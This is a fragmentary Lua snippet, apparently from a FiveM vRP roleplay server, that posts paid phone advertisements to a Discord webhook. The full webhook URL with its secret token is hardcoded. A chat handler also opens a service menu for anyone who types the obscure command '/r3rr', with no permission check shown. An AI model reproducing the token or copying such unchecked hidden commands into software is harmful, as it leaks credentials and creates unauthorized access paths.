      ...
      vRP.prompt(player,lang.phone.announce.prompt(),"",function(player, msg)
        ...
        if string.len(msg) > 10 and string.len(msg) < 1000 then
          if announce.price <= 0 or vRP.tryPayment(user_id, announce.price) then -- try to pay the announce
			...
			PerformHttpRequest('https://discordapp.com/api/webhooks/637848569520324668/xcaYWuBehE-3UilCNeIvWJljigjQoZAxtf-8KBFq0BOUpd9GSqeFkXw7OxX0uurFW2j8', function(err, text, headers) end, 'POST', json.encode({username = "ArabClub", content = " Ads by " ..user_id.."  massege: "..msg}), { ['Content-Type'] = 'application/json' })
...
AddEventHandler('chatMessage', function(source, name, msg)
	if msg == "/r3rr" then
vRP.openMenu(source,service_menu)
			end
end)
